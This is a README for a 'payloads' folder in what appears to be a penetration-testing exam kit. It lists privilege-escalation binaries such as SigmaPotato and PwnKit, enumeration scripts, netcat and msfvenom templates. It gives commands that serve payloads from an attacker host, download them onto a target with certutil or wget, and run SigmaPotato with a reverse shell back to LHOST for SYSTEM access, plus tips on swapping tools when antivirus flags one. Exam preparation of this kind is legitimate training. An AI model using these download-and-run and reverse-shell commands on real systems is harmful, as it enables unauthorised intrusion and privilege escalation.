# payloads/ — pre-staged binaries & payloads

Everything you drop onto the target. **Stage the binaries at home with internet** (`bash
scripts/fetch-binaries.sh`) and commit them, so an exam-day `git clone` already has them.
All reverse-shell/listener ports are **4444 (foothold) / 5555 (privesc) / 6666 (spare)**.

## What lives here
| File | Purpose | How to get it |
|------|---------|---------------|
| `reverse-shells.txt` | copy-paste reverse-shell one-liners (Win/Linux) | in repo |
| `msfvenom-templates.sh` | build staged .exe/.msi/.aspx/.elf payloads | `LHOST=.. bash payloads/msfvenom-templates.sh` |
| `SigmaPotato.exe` | ⭐ SeImpersonate→SYSTEM (`--revshell`/`--cmd`) | fetch-binaries.sh |
| `PrintSpoofer64.exe` | SeImpersonate→SYSTEM (interactive) | fetch-binaries.sh |
| `GodPotato-NET4.exe` | SeImpersonate→SYSTEM (match .NET ver) | fetch-binaries.sh |
| `winPEASx64.exe` | Windows enum one-shot | fetch-binaries.sh |
| `nc.exe` / `nc64.exe` | netcat for Windows | fetch-binaries.sh |
| `linpeas.sh` | Linux enum one-shot | fetch-binaries.sh |
| `pspy64` | watch cron/processes (no root) | fetch-binaries.sh |
| `LinEnum.sh` | Linux enum (classic) | fetch-binaries.sh |
| `PwnKit.c` | CVE-2021-4034 local root (last resort) | fetch-binaries.sh |

## Exam-day usage (quick)
```bash
# 1) serve this dir from Kali:
cd payloads && python3 -m http.server 8081

# 2) on target, pull what you need:
#    Windows:  certutil -urlcache -f http://LHOST:8081/SigmaPotato.exe C:\Windows\Temp\sp.exe
#    Linux:    wget http://LHOST:8081/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh

# 3) SeImpersonate present?  ->  SYSTEM in one line (listener l5 on 5555 first):
#    C:\Windows\Temp\sp.exe --revshell LHOST 5555
```

## Notes
- `msfvenom` here does **not** count as the single Metasploit use (only `msfconsole`
  exploitation does). Build as many staged payloads as you want.
- If a Potato is AV-flagged, try another (SigmaPotato ↔ PrintSpoofer ↔ GodPotato).
- Match **GodPotato-NET&lt;ver&gt;** to the target's .NET; try NET4 first if unsure.
- These binaries are **gitignored by default is OFF** here — they ARE committed so the clone is
  self-contained. If your repo is public, keep it private or strip binaries before pushing.
